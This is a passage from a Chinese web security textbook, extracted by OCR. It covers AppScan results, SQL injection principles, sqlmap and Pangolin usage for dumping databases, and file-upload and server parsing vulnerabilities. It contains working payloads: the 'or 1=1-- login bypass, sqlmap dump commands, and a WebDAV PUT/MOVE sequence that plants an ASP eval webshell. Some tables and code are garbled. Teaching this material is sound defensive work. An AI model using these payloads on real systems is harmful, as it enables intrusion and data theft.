选择完扫描方式后（默认选择“启动全面自动扫描”），选中“完成‘扫描配置向导’后启动‘扫描专家’”复选框，单击“完成”按钮，AppScan会提示保存，默认以.scan文件类型保存至自定义的文件中。需要再次查看，可直接双击打开。

扫描专家评估可以对 Web 应用程序进行一个简短的扫描，以评估配置的效率。在简短的扫描结束后，扫描专家会建议 “应用建议” 或 “忽略所有”，可以选择应用建议，也可以直接关闭拒绝扫描专家的建议，如图 4-15 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0040_e15a372eab21.jpg)



图 4-15 扫描专家建议配置



本节测试选择“忽略所有”，扫描继续。扫描结果如图4-16所示。


<table><tr><td colspan="2">(F) 综合(E) 语言(V) 扫描(S) 工具(T) 帮助(H)</td></tr><tr><td colspan="2">暂停 手动探查 配置 报告 查找 扫描日志 PowerTools</td></tr><tr><td colspan="2">URL 显于内容的</td></tr><tr><td>的应用程序(26)
http://demo.testfire.net/ (26)
- / 
comment.aspx (6)
default.aspx (1)
disclaimer.htm (1)
feedback.aspx (1)
search.aspx (3)
survey_questions.aspx
bank (13)
images
pr (1)</td><td>安排依据：严重性 造成
“我的应用程序”中有26个安全性问题（131个实体）
Poison Null Byte Windows 文件检索(1)
SQL 注注(1)
http://demo.testfire.net/comment.aspx (1)
comments
SQL 注入(2)
基于DOM的站点脚本绘制(1)
站点脚本绘制(4)
已保存的登录请求(1)
链接注入（便于网站请求伪造）(2)
目录列表(2)
通过框架钓鱼(2)
发现数据库错误模式(3)
启用了Microsoft ASP.NET调试(1)
自动写表对密码字段常用的HTML属性(1)
HTML注释敏感信息泄露(1)
发现可能的服务器路径泄露模式(1)
应用程序错误(3)</td></tr></table>


图 4-16 扫描结果


## 4.2.2 处理结果

AppScan扫描完毕后，可以将完整的扫描结果导出。导出结果分以下两种形式：

○ 导出 XML 文件。

○ 导出关系型数据库。

AppScan 也可以对完整的扫描进行保存，选择 “文件” → “保存” 命令，将完整的扫描结果保存为以.scan 为后缀的文件，该文件可直接双击打开，打开后即可看到完整的扫描信息，如图 4-17 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0041_025c1b124175.jpg)



图 4-17 扫描结果保存


AppScan 也支持生成报告。选择 “工具” → “报告” 命令后，创建报告，在 “报告类型” 中选择对应的报告模板，在 “布局” 中也可以填写报告标题、描述等信息，如图 4-18 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0042_aff98ecf4589.jpg)



图 4-18 生成报告


单击“保存报告”按钮后，可选择需要的报告格式，AppScan 支持 PDF、HTML、TXT、RTF 格式。

## 第3篇

## Web 常见漏洞介绍

# SQL 注入漏洞

SQL 注入漏洞是 Web 层面最高危的漏洞之一。由于部分程序员缺乏安全意识，SQL 注入漏洞随处可见，用户登录或搜索时，只要输入一个单引号就可以检测是否存在这种漏洞。目前，随着 Web 应用程序的安全性不断提高，SQL 注入漏洞有所减少，同时也变得相对难以检测与利用。

本章将对 SQL 注入漏洞进行详细分析。

## 5.1 SQL 注入原理

所谓 SQL 注入，就是通过把 SQL 命令插入到 Web 表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令。具体来说，它是利用现有应用程序，将（恶意）的 SQL 命令注入后台数据库引擎执行的能力，可以通过在 Web 表单中输入（恶意）SQL 语句获取一个存在安全漏洞的网站上的数据库权限，而不是按照设计者意图去执行 SQL 语句。下面通过一个经典的万能密码登录案例深入浅出地介绍 SQL 注入漏洞。

本节以测试网站 http://www.test.cn/login.jsp 为例，对 SQL 注入进行分析。

图 5-1 为 login.jsp 的登录页面，这是一个简单的登录表单，当输入用户名、密码后，JSP 程序会查询数据库：若数据库存在此用户名且对应的密码符合，将跳转至 list.jsp 页面。若用户名不存在或密码错误，将无法登录并返回到登录页面。

![image](MinerU_markdown_Web安全基础教程_assets/image_0043_101fad4fce61.jpg)



图 5-1 登录页面


首先使用一个特殊的用户 “'or 1=1--”，密码随意填写，然后进行登录。奇怪的是，居然可以正常登录，并进入学生信息列表页，如图 5-2 所示。

<table><tr><td>ID</td><td>姓名</td><td>性别</td><td>年龄</td></tr><tr><td>1</td><td>李明</td><td>男</td><td>16</td></tr><tr><td>2</td><td>赵宝刚</td><td>男</td><td>15</td></tr><tr><td>3</td><td>王学雯</td><td>女</td><td>15</td></tr><tr><td>4</td><td>张雪</td><td>男</td><td>16</td></tr></table>


图 5-2 学生信息列表


假设存在一个用户名和密码均为 admin 的用户信息，当单击登录按钮时，程序会将登录请求自动拼接为 SQL 语句。如下：

```txt
select count("") from user where username='admin' and password='admin' 
```

之后程序会根据拼接的 SQL 语句到数据库 user 表中进行匹配查询，若存在 admin 这个用户，且密码也为 admin 时，则程序登录验证成功并跳转到列表页，否则验证失败，重新登录。

输入用户名为 “'or 1=1--”，任意密码，单击登录按钮后，程序会自动拼接 SQL 语句如下：

```sql
select count(*) from user where username='or 1=1--'and password='admin' 
```

注意：正确的语句为 username='账号' and password='密码'，使用特殊账号后变为：username='账号' or 1=1-- 'and password='密码'。分析 SQL 语句后，终于找到了问题所在，变化后的 SQL 语句很显然 password 是不起作用的，因为被注释掉了。而且 username="or 1=1" 语句永远成立，所以最终的执行结果其实变成了：

```sql
select count(*) from user 
```

```txt
//查询 user 表多少个用户
```

很显然，该语句没有问题，可成功登录。

○ count()函数：返回匹配指定条件的行数。

or: or 前后若有一个为真，则为真。

- --: SQL 中的注释，“--”后的语句无效，“—”后面必须有空格。

以上简单介绍了 SQL 注入的原理，用一句话概括就是：程序未对用户提交的参数进行，过滤，导致提交的特殊语句可被 SQL 解释器执行。

## 5.2 注入漏洞分类

SQL 注入可按数据类型和请求类型进行分类。按照数据类型可分为：数字型和字符型注入。按照请求类型可分为：GET 注入、POST 注入、Cookie 注入。本节将重点介绍数字型和字符型注入。

## 5.2.1 数字型注入

输入的参数为整数时，即为数字型注入，如 ID、年龄等。数字型注入是最简单的一种注入方式。

测试 url 地址为 http://www.test.com/view.jsp?id=1。

根据请求的 URL 可拼接的 SQL 查询语句为:

```txt
select * from student where id=1 //查询 student 表中 id 为 1 的学生信息
```

数字型注入漏洞的判断方法也极为简单，如下：

(1) 在参数 id 后加上单引号:

```javascript
http://www.test.com/view.jsp?id=1' 
```

根据请求 URL，可拼接 SQL 语句为 select * from student where id=1'，访问上述连接后，返回数据库报错信息。由此说明程序已经执行了 SQL 语句，但是因为 “1” 非整数，导致 SQL 语句无法正常执行。所以返回数据库报错信息，如图 5-3 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0044_35c35767f7eb.jpg)



图 5-3 返回错误信息


(2) 在参数 id 后加上 “and 1=1” :

```javascript
http://www.test.com/view.jsp?id=1 and 1=1 
```

其 SQL 语句为 select * from student where id=1 and l=1，语法正确，返回页面与 id=1 是一样的，如图 5-4 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0045_90ec3c80a1d1.jpg)



图 5-4 返回学生信息


## (3) 在参数 id 后加上 “and 1=2”:

```txt
http://www.test.com/list.asp?id=1 and 1=2 
```

其 SQL 语句为 select * from student where id=1 and 1=2，语法正确，但是 1=2 永远不成立，所以程序正常执行，但是未查到学生信息，如图 5-5 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0046_f2eb2047b98f.jpg)



图 5-5 返回学生信息


若以上 3 个步骤全部满足，则可判断该程序可能存在 SQL 注入漏洞。

数字型注入多出现在 ASP、PHP 等弱类型语言中，弱类型语言会自动推导变量类型，例如，若参数 id=1，PHP 会自动判断 id 为 int 类型；若参数 id=1 and l=1，则会自动判断为 string 类型，这是弱类型语言的特性。而对于 Java 这种强类型语言，若试图把一个 string 型转换为 int 型，程序会抛出异常，无法继续执行，且这一步是发生在 SQL 语句查询之前。所以强类型语言很少存在数字型注入漏洞。

## 5.2.2 字符型注入

输入的参数为字符串时，即为字符型注入，如姓名、密码等。字符型注入与数字型注入的区别在于：字符型注入需要闭合单引号，而数字型注入则不需要闭合单引号。

以登录页面为例, 测试注入的 URL 为 http://www.test.com/login.jsp, 当输入用户名 admin、密码 admin123 时, 根据请求 URL 拼接 SQL 查询语句为:

```sql
Select * from user where username='admin' and password='admin123' 
```

语法正确，同时存在用户名为 admin，密码为 admin123 的用户，所以登录成功，跳转至 list.jsp。

但是，若在用户名处输入 “admin and 1=1”，则无法进行登录，因为程序会将 “admin and 1=1” 当作一个整体来查询。SQL 查询语句为：

```sql
Select * from user where username='admin and 1=1'and password=' 
```

语法正确，但是不存在用户名为 admin and 1=1 的用户，所以查询失败，登录不成功。

继续在用户名处输入 “admin'or1=1--” 即可继续注入。分析 SQL 查询语句为:

```sql
Select * from user where username='admin'or1=1--'and password=' 
```

语法正确，其中“—”注释了最后一个单引号及后面的语句，所以查询语句变为：

```sql
Select * from user where username='admin' or 1=1 
```

1=1 恒成立，且存在 admin 这个用户，所以返回用户名为 admin 的所有信息。由上可知，对于字符型注入，必须注意字符串的闭合问题。

注意：只要是字符型注入，必须闭合单引号及注释掉多余的代码。

## 5.3 注入工具

学会判断网站是否存在注入后，可借助工具来进一步判断注入。

常用的 SQL 注入工具有 Sqlmap、Pangolin、Havij、明小子等。接下来介绍 Sqlmap、Pangolin 两种注入工具。

## 5.3.1 Sqlmap

Sqlmap 是一个开放源码的渗透测试工具，可以自动探测和利用 SQL 注入漏洞以及接管数据库服务器的过程。Sqlmap 支持多种数据库，多种类型与模式的注入，功能非常强大，被称为 SQL 注入的第一神器。可从 Sqlmap 官网下载并了解更多 Sqlmap 介绍。

Sqlmap 官网地址：http://Sqlmap.sourceforge.net/。

## 1. Sqlmap 运行环境

运行 Sqlmap 需要有 Python 2.7 环境支持，任意一台安装了 Python 的操作系统都可以使用它。

Python 可从其官网下载，地址：https://www.Python.org/。

Sqlmap 支持的数据库如下:

MySQL 

○ Oracle 

○ PostgreSQL 

○ Microsoft SQL Server 

○ Microsoft Access 

O IBM DB2 

○ SQLite 

○ Firebird 

○ Sybase 

○ SAP MaxDB 

## 2. Sqlmap 常用参数介绍

--current-user: 检索数据库管理系统当前用户。

--current-db: 检索数据库管理系统当前数据库。

--columns: 枚举 DBMS 数据库表列。

--dump: 转储数据库管理系统的数据库中的表项。

--dbms=DBMS: 强制后端的 DBMS 为此值。

--tables: 枚举的 DBMS 数据库中的表。

- -D DB: 要进行枚举的数据库名。

- -T TBL: 要进行枚举的数据库表。

- -C COL: 要进行枚举的数据库列。

- p TESTPARAMETER: 可测试的参数。

--level=LEVEL: 执行测试的等级（1～5，默认为1）。

○ --version: 显示程序的版本号并退出。

## 3. Sqlmap 的使用

以本地搭建的网站 http://www.test.com/view.jsp?id=1 为例，使用 Sqlmap 进行注入如下所示：

○ 使用-u 参数，指定 URL:

```batch
Sqlmap.py -u"http://www.test.com/view.jsp?id=1" 
```

若注入存在，将显示出 Web 容器、数据库版本信息，如图 5-6 所示：

<table><tr><td>C:\sqlnap&gt;sqlmap.py -u&quot;http://www.test.com/view.jsp?id=1&quot;</td></tr><tr><td>Place: GET
Parameter: id
Type: boolean-based blind
Title: AND boolean-based blind - WHERE or HOUING clause
Payload: id=1 AND 9754=9754
Type: error-based
Title: MySQL &gt;= 5.0 AND error-based - WHERE or HOUING clause
Payload: id=1 AND &lt;SELECT 1148 FROM&lt;SELECT COUNT(=),CONCAT(0x7176636671,&lt;SELECT &lt;CASE WHEN (1148-1148) THEN 1 ELSE 0 END)),0x7164797971,FLOOR&lt;RAND(0)=2&gt;&gt;x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x&gt;a&gt;
Type: UNION query
Title: MySQL UNION query (NULL) - 5 columns
Payload: id=-2589 UNION ALL SELECT NULL,NULL,CONCAT(0x7176636671,0x42584a79406373546255,0x7164797971),NULL,NULL
Type: AND/OR time-based blind
Title: MySQL &gt; 5.0.11 AND time-based blind
Payload: id=1 AND SLEEP(S)</td></tr><tr><td>(15:53:46 | INFO) the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL 5.0</td></tr></table>


图 5-6 获取 Web 容器、数据库版本信息


○ 使用--dbs 参数，获取数据库：

Sqlmap.py -u" http://www.test.com/view.jsp?id=1"-dbs 

结果如图 5-7 所示。

<table><tr><td>[15:56:06 | INFO] retrieved: &quot;student&quot;</td></tr><tr><td>[15:56:06 | INFO] retrieved: &quot;test&quot;</td></tr><tr><td>available databases [5]:</td></tr><tr><td>[*] information_schona</td></tr><tr><td>[*] mysql</td></tr><tr><td>[*] performance_schena</td></tr><tr><td>[*] student</td></tr><tr><td>[*] test</td></tr><tr><td>[15:56:06 | CANDUENO] HTTP</td></tr></table>


图 5-7 获取数据库信息


○ 使用--tables 参数，获取指定数据库的所有表：

```txt
Sqlmap.py -u" http://www.test.com/view.jsp?id=1"-D 指定数据库名(student)--tables
```

结果如图 5-8 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0047_4c505bf1778a.jpg)



图 5-8 获取数据表信息


○ 使用--columns 参数，获得指定数据库下指定表的所有字段：

```txt
Sqlmap.py -u" http://www.test.com/view.jsp?id=1"-D 指定数据库名（student）-T 指定数据表名 (user)--columns
```

结果如图 5-9 所示。

<table><tr><td colspan="2">Database: student
Table: user
[3 columns]</td></tr><tr><td>! Column</td><td>Type</td></tr><tr><td>! id</td><td>int(11)</td></tr><tr><td>password</td><td>varchar(255)</td></tr><tr><td>username</td><td>varchar(255)</td></tr><tr><td colspan="2">+----+----+</td></tr></table>


图 5-9 获取字段信息


○ 使用--dump 参数，获得指定字段内容：

```txt
Sqlmap.py -u" http://www.test.com/view.jsp?id=1"-D 指定数据库名（student）-T 指定数据表名(user)-C 字段名(username)-dump
```

结果如图 5-10 所示。

<table><tr><td>Database: student</td></tr><tr><td>Table: user</td></tr><tr><td>[2 entries]</td></tr><tr><td>+----+</td></tr><tr><td>| username |</td></tr><tr><td>+----+</td></tr><tr><td>| admin |
| zhangsan |
+----+</td></tr></table>


图5-10 获取字段内容


更多 Sqlmap 参数可参照 Sqlmap.py -h 命令。

## 5.3.2 Pangolin

Pangolin（中文译名为“穿山甲”）是一款帮助渗透测试人员进行Sql注入测试的安全工具，是深圳宇造诺赛科技有限公司（Nosec）旗下的网站安全测试产品之一。

Pangolin 能够通过一系列非常简单的操作，达到最大化的攻击测试效果，从检测注入开始到最后控制目标系统都给出了测试步骤。Pangolin 是目前国内使用率最高的 SQL 注入测试的安全软件，可以说是网站安全测试人员的必备工具之一。

## 1. Pangolin 运行环境

目前 Pangolin 只能运行在 Windows 系统平台，支持 32 位/64 位 Windows NT/2000/XP/2003/Vista/2008 系统。

## 2. Pangolin 支持的数据库

Pangolin 提供全面的数据库支持，包括：

Access 

O DB2 

○ Infromix 

- Microsoft SQL Server2000/2005/2008 

○ MySQL 

○ Oracle 

PostgreSQL 

- Sqlite3 

○ Sybase 

## 3. Pangolin 的使用

Pangolin 的使用相对简单，如图 5-11 所示为 Pangolin 的主界面。

![image](MinerU_markdown_Web安全基础教程_assets/image_0048_43069de9cf06.jpg)



图 5-11 Pangolin 主界面


本节对 Pangolin 做简单的介绍。以本地搭建网站为例，测试 URL 为 http://www.test.com/view.jsp?id=20

（1）首先将注入链接放入 URL 输入框，单击运行按钮后，Pangolin 会自动判断注入类型，并返回注入结果，如图 5-12 所示。

（2）在 Informations 选项卡中单击 Go 按钮，可进一步获得信息，如图 5-13 所示。

（3）在 Datas 选项卡中单击 Tables 按钮，可获得数据表信息，如图 5-14 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0049_642aa70bfbd5.jpg)



图 5-12 测试注入


![image](MinerU_markdown_Web安全基础教程_assets/image_0050_e656af9ebb61.jpg)



图 5-13 信息探测


![image](MinerU_markdown_Web安全基础教程_assets/image_0051_c012048d16aa.jpg)



图 5-14 获取数据表


（4）在 Datas 选项卡中选择数据表，单击 All 按钮可获得所有表和表字段信息，有了表与表字段后，选择相应字段，单击 Datas 按钮可获得字段内容，如图 5-15 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0052_8a911dcbfbb5.jpg)



图5-15 获取字段内容


## 5.4 实战操作

本小节通过实战操作演示来更深入的了解以下 3 个方面。

目标地址：http://www.test.com/view.jsp?id=2。

（1）初步了解网站（系统）如何被执行恶意 SQL 命令语句（注入的原理）。

(2) 如何判断网站是否存在数字型 SQL 注入漏洞。

（3）使用 Sqlmap 和 Pangolin 工具对目标网站进行注入。

详细操作流程请参考第 5 章视频 5-1、5-2 和 5-3。

## 上传漏洞

文件上传漏洞是指用户上传一个可执行的脚本文件，并通过此脚本文件获得执行服务器端命令的能力。这种攻击方式是最为直接和有效的，几乎没有什么技术门槛。

上传功能在互联网中应用得非常普遍。例如，上传一张自定义的图片；分享一段视频或者照片；论坛发帖时附带一个附件；在发送邮件时附带附件等。

文件上传功能本身是一个正常业务需求，对于网站来说，很多时候也确实需要用户将文件上传到服务器，所以“文件上传”本身没有问题，但有问题的是文件上传后，服务器怎么处理、解析文件。若服务器的处理逻辑做的不够安全，则会导致严重的后果。

文件上传后导致的常见安全问题一般有：

- 上传文件是 Web 脚本语言，服务器的 Web 容器解析并执行了用户上传的脚本，导致代码执行。

○ 上传文件是 Flash 的策略文件 crossdomain.xml，黑客用以控制 Flash 在该域下的行为（其他通过相似方式控制策略文件的情况类似）。

○ 上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行。

除此之外，还有一些不常见的方法，例如，将上传文件作为一个入口，溢出服务器的后台处理程序，如图片解析模块；或者上传一个合法的文本文件，其内容包含了 PHP 脚本，再通过 “本地文件包含漏洞（Local File Include）” 执行此脚本等。

## 6.1 直接上传漏洞

直接上传漏洞指上传功能对上传文件扩展名过滤不严，导致攻击者能直接上传脚本文件，因此攻击者只要打开上传页面，直接上传脚本文件，即可拿到 WebShell、拥有网站的管理员控制权。下面看一个文件上传漏洞的案例。

FCKEditor 是一款非常流行的文本编辑器，为了方便用户，它带有一个上传文件功能，但是这个功能却出过许多次漏洞。

FCKEditor 针对 ASP/PHP/JSP 等环境都有对应的版本，以 aspx 为例，其文件上传功能位置为：

http://target/fckeditor/editor/filemanager/browser/default/browser.html?type=Image&connector=connectors/aspx/connector.aspx 

用户打开这个页面，就可以使用此功能将任意文件上传到服务器。文件上传后，会保存在/UserFiles/Image/目录下。如图 6-1 所示即为 FCKEditor 的文件上传界面。

![image](MinerU_markdown_Web安全基础教程_assets/image_0053_0a9bd265078c.jpg)



图 6-1 FCKEditor 的文件上传界面


在存在漏洞的版本中，通过检查文件的后缀来确定是否安全，代码如下：

```javascript
\(Config['AllowedExtensions']['File']=array(); //允许上传的类型
\(Config['DeniedExtensions']['File']=array('html','htm','php','php2','php3','php4','php5','phtml','pwml','inc','asp','aspx','ascx','jsp','cfm','cfc','pl','bat','exe','com','dll','vbs','js','reg','cgi','htaccess','asis'); //禁止上传的类型\)
```

这段代码是以黑名单的方式限制上传文件的类型。以这个黑名单为例，若上传.asa、.cer、.pwml等类型文件，可能导致安全问题。

由于 FCKEditor 一般是作为第三方应用集成到网站中的，因此文件上传的目录一般默认都会被 Web 容器所解析，很容易造成文件上传漏洞。很多开发者在使用 FCKEditor 时，可能不知道它存在文件上传功能。若不需要，建议删除 FCKEditor 的文件上传代码。

## 6.2 中间件解析漏洞

## 6.2.1 IIS 解析漏洞

IIS 6 在处理文件解析时，也出过一些漏洞。在 IIS 和 Windows 环境下曾经出现过通过字符截断文件名的漏洞，截断字符为分号 “;”。

当文件名为 abc.asp;xx.jpg 时，IIS 6 会将此文件解析为 ábc.asp，文件名被截断了，从而导致脚本被执行。例如：

```txt
http://www.target.com/path/xyz.asp;abc.jpg 
```

会执行 xyz.asp，而不是 abc.jpg。

除此漏洞外，在 IIS 6 中还曾经出过一个漏洞——因为处理文件夹扩展名出错，导致将/*.asp/目录下的所有文件都作为 ASP 文件进行解析。例如：

```txt
http://www.target.com/path/xyz.asp/abc.jpg 
```

这里的 abc.jpg 会被当作 ASP 文件进行解析。

注意这两个 IIS 的漏洞，是需要在服务器的本地硬盘上确实存在这样的文件或者文件夹才能触发，若只是通过 Web 应用映射出来的 URL，则是无法触发的。

这些历史上存在的漏洞，也许今天还能在互联网中找到不少未修补漏洞的网站。

谈到 IIS，就不得不谈在 IIS 中，支持 PUT 功能所导致的若干上传脚本问题。

PUT 是在 WebDav 中定义的一个方法。WebDav 大大扩展了 HTTP 协议中 GET、POST、HEAD 等功能，它所包含的 PUT 方法，允许用户上传文件到指定的路径下。

在许多 Web Server 中，默认都禁用了此方法，或者对能够上传的文件类型做了严格限制。但在 IIS 中，若目录支持写权限，同时开启了 WebDav，则会支持 PUT 方法，再结合 MOVE 方法，就能够将原本只允许上传文本文件改写为脚本文件，从而执行 WebShell。MOVE 能否执行成功，取决于 IIS 服务器设置中是否选中了“脚本资源访问”复选框。

一般要实施此攻击过程，攻击者应先通过 OPTIONS 方法探测服务器支持的 HTTP 方法类型，若支持 PUT，则使用 PUT 上传一个指定的文本文件，最后再通过 MOVE 方法改写为脚本文件。

第一步：通过 OPTIONS 探测服务器信息。

```txt
OPTIONS /HTTP/1.1
HOST:www.target.com 
```

返回：

```csv
HTTP/1.1 200 OK
Server: Microsoft-IIS/6.0
X-Powered-By: ASP.NET
MS-Author-Via: DAV
Content-Length:0
Accept-Ranges:none
DASL:<DAV.sql>
DAV; 1.2
Public: OPTIONS, TRACE,GET,HEAD,DELETE,PUT,POST,COPY,MOVE
Allow: OPTIONS,TRACE,GET,HEAD,DELETE,PUT,POST,COPY,MOVE
Cache-Control:privare 
```

第二步：上传文本文件。

```asp
PUT /test.txtHTTP/1.1
Host:www.target.com
Content-Length: 16
<%eval(request("cmd"))%> 
```

返回：

```csv
HTTP/1.1 201 Created
Server: Microsoft-IIS/6.0
X-Powered-By: ASP.NET
Location:http://target
Content-Length: 0
Allow: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE 
```

成功创建文件。

第三步：通过 MOVE 改名。

```htaccess
MOVE /test.txt HTTP/1.1
Host:target
Destination:http://www.target.com/shell.asp 
```

返回：

```txt
HTTP/1.1 201 Created
Server: Microsoft-IIS/6.0
X-Powered-By: ASP.NET
Location:http://www.target.com/shell.asp 
```

Content-Type: text/html 

Content-Length:0 

修改成功。

从攻击原理看，PUT 方法造成的安全漏洞，都是由于服务器配置不当造成的。WebDav 给管理员带来了很多方便，但若不能了解安全的风险和细节，等于向黑客敞开了大门。

## 6.2.2 Apache 解析漏洞

在 Apache 1.x、Apache 2.x 中，对文件名的解析就存在以下特性。

Apache 对于文件名的解析是从后往前解析的，直到遇见一个 Apache 可识别的文件类型为止，例如，Phpshell.php.rar。

因为 Apache 不识别.rar 这个文件类型，所以会一直遍历后缀到.php，然后认为这是一个 PHP 类型的文件。那么 Apache 怎么知道哪些文件是它所认识的呢？这些文件类型定义在 Apache 的 mime.types 文件中，如图 6-2 所示。

```txt
# This is a comment. I love comments.
-*- indent-tabs-mode: t -*
# This file controls what Internet media types are sent to the client for
# given file extension(s). Sending the correct media type to the client
# is important so they know how to handle the content of the file.
# Extra types can either be added here or by using an AddType directive
# in your config files. For more information about Internet media types,
# please read RFC 2045, 2046, 2047, 2048, and 2077. The Internet media type
# registry is at <http://www.iana.org/assignments/media-types/>. 
```


图 6-2 Apache httpd server 的 mime.types 文件


Apache 的这个特性，很多工程师在写应用时并不知道，即便知道，可能有的工程师也会认为这是 Web Server 该负责的事情。若不考虑这些因素，写出的安全检查功能可能就会存在缺陷。例如，.rar 是一个合法的上传需求，在应用里只判断文件的后缀是否是.rar，最终用户上传的是 phpshell.php.rar，从而导致脚本被执行。

## 6.2.3 Nginx 解析漏洞

2010年5月, 国内的安全组织80sec发布了一个Nginx的漏洞, 指出在Nginx配置fastcgi使用PHP时, 会存在文件类型解析问题, 这将给上传漏洞打开方便之门。

后来人们发现，这不是 Nginx 特有的漏洞，在 IIS 7.0、IIS7.5、Lighttpd 等 Web 容器中也存在这样的解析漏洞。

早在 2010 年 1 月时，在 PHP 的 bug tracker 上就有人分别在 PHP 5.2.12 和 PHP 5.3.1 版本下提交了这个 bug，并同时给出了一个第三方补丁。可是 PHP 官方认为这是 PHP 的一个产品特性，并未接受此补丁。

这个漏洞是怎么回事呢？其实它与 Nginx 本身关系不大，Nginx 只是作为一个代理把请求转发给 fastcgi Server，PHP 在后端处理这一切，因此在其他的 fastcgi 环境下，PHP 也存在此问题，只是使用 Nginx 作为 Web Server 时，一般使用 fastcgi 的方式调用脚本解释器，这种使用方式最为常见。

这个问题的外在表现是，当访问以下 URL 时，会将 test.jpg 当作 PHP 文件进行解析。notexist.php 是不存在的文件。

http://www.xxxx.com/path/test.jpg/notexist.php 

试想：若在任何配置为 fastcgi 的 PHP 应用里上传一张图片（可能是头像，也可能是论坛里上传的图片等），其图片内容是 PHP 文件，则将导致代码执行。其他可以上传的合法文件，如文本文件、压缩文件等情况类似。

出现这个漏洞的原因与“在 fastcgi 方式下，PHP 获取环境变量的方式”有关。PHP 的配置文件中有一个关键的选项：cgi.fix_pathinfo，这个选项在某些版本中默认是开启的。

在开启时访问 URL: http://www.xxxx.com/path/test.jpg/notexist.php，由于 notexist.php 是不存在的文件，所以 PHP 会向前递归解析，造成解析漏洞。此漏洞与 Nginx 无关，但由于 Nginx 和 PHP 的组合容易造成这种解析漏洞，所以 PHP CGI 漏洞常常被认为是 Nginx 解析漏洞。

## 6.3 绕过上传漏洞

## 6.3.1 客户端检测

任何客户端验证都是不安全的。客户端验证是防止用户输入错误，减少服务器开销，而服务器端验证才可以真正防御攻击者。针对客户端验证有非常多的绕过方法，下面列举两种方式。

## 1. 使用 FireBug

FireBug 是一款开源的浏览器插件，支持 Firefox、Chrome 等浏览器，可以让 Web 开发者轻松地调试 HTML、JavaScript、Ajax、CSS 等前端脚本代码。FireBug 像一把瑞士军刀，从不同的角度剖析 Web 页面内部的细节层面，属于 Web 开发人员的必备武器。正由于 FireBug 功能强大，所以才被黑客认为是必备利器。

介绍完 FireBug 后，再来看如何使用 FireBug 绕过客户端检测。

当单击“提交”按钮后，Form 表单将会触发 onsubmit 事件，onsubmit 事件将会调用 checkFile 函数。checkFile 函数将会检测文件扩展名是否合法，并返回一个布尔值。若 checkFile 函数返回 true，则表单提交，反之，将弹出对话框提示“文件不合法！！”文件将无法提交到服务器。知道这一点后，可以使用 FireBug 将 onsubmit 事件删除，这样就可以绕过 JavaScript 函数验证。

## 2. 中间人攻击

中间人攻击这种方式与 FireBug 完全不同，FireBug 是删除客户端的 JavaScript 验证，而使用 Burp Suite 则是按照正常的流程通过 JavaScript 验证，然后在传输中的 HTTP 层做手脚。

首先把木马文件扩展名改为正常图片的扩展名，例如，.jpg 扩展名，在上传时使用 BurpSuite 拦截上传数据，再将其中的扩展名.jpg 修改为.php，就可以绕过客户端验证，如图 6-3 所示。


图 6-3 使用 Burp Suite 修改扩展名


这里需要注意一点：在 HTTP 协议中有请求头 Content-Length，代表实体正文长度，若此时的 filename 被修改，也就意味着实体正文长度增加或者减少了，这时就应该修改 Content-Length 请求头，例如，Content-Length 长度为 190，把文件流中的 filename="test.jpg" 修改为 filename="1.php"。更改后，实体正文少了 3 个字符，所以需要把 Content-Length 修改为 187，若不修改，上传可能会失败。

## 6.3.2 服务器端检测

随着开发人员安全意识的提高，使用前端验证攻击的行为越来越少，一般放在服务器端做验证。而服务器端验证分为很多种，因为每个程序员的思路不一样，所以过滤的方式也不一样，但主要包含以下几点：白名单与黑名单扩展名过滤、文件类型检测、文件重命名等操作。这样看起来似乎无懈可击，但不要忘记一点，那就是解析漏洞。若 Web 开发人员不考虑解析问题，上传漏洞配合解析漏洞，可以绕过大多数上传验证。

## 1. 白名单与黑名单验证

在上传文件时，大多数程序员会对文件扩展名进行检测，验证文件扩展名通常有两种

方式：黑名单与白名单。

## (1) 黑名单过滤方式

黑名单过滤是一种不安全的方式，黑名单定义了一系列不安全的扩展名，服务器端在接收文件后，与黑名单的扩展名对比，若发现文件扩展名与黑名单里的扩展名匹配，则认为文件不合法，攻击者可以使用很多方法来绕过黑名单检测。

- 攻击者可以从黑名单中找到 Web 开发人员忽略的扩展名。

若服务器端并没有对接收到的文件扩展名进行大小写转换操作，那就意味着可以上传 ASP、PHP 这样的扩展名，而此类扩展名在 Windows 平台依然会被 Web 容器解析。

Windows 系统下，若文件名以 “.” 或者空格作为结尾，系统会自动去除 “.” 与空格，利用此特性也可以绕过黑名单验证，例如，上传 asp. 或者 asp_（此处的下划线表示空格）扩展名程序，服务器端接收文件名后，在写文件操作时，Windows 将会自动去除小数点和空格。

通过上面 3 个例子，相信读者应该明白仅仅依靠黑名单过滤的方式是无法防御上传漏洞的，因为未知的风险太多，无法预测。

## (2) 白名单过滤方式

白名单的过滤方式与黑名单恰恰相反，黑名单是定义不允许上传的文件扩展名，而白名单则是定义允许上传的扩展名，白名单拥有比黑名单更好的防御机制，例如：

$$
\text { WhiteList } = \text { array } (^ {\prime} r a r ^ {\prime}, ^ {\prime} j p g ^ {\prime}, ^ {\prime} p n g ^ {\prime}, ^ {\prime} b m p ^ {\prime}, ^ {\prime} g i f ^ {\prime}, ^ {\prime} j p g ^ {\prime}, ^ {\prime} d o c ^ {\prime});
$$

在获取到文件扩展名后对$WhiteList 数组里的扩展名迭代判断，若文件扩展名被命中，程序将认为文件是合法的，否则不允许上传。

虽然采用白名单的过滤方式可以防御未知风险，但是不能完全依赖白名单，因为白名单并不能完全防御上传漏洞，例如，Web 容器为 IIS 6.0，攻击者把木马文件名改为 pentest.asp;1.jpg 上传，此时的文件为 JPG 格式，从而可以顺利通过验证，而 IIS 6.0 却会把 'pentest.asp;1.jpg 当作 ASP 脚本程序来执行，最终攻击者可以绕过白名单的检测，并且执行木马程序。

白名单机制仅仅是防御上传漏洞的第一步。

## 2. MIME 验证

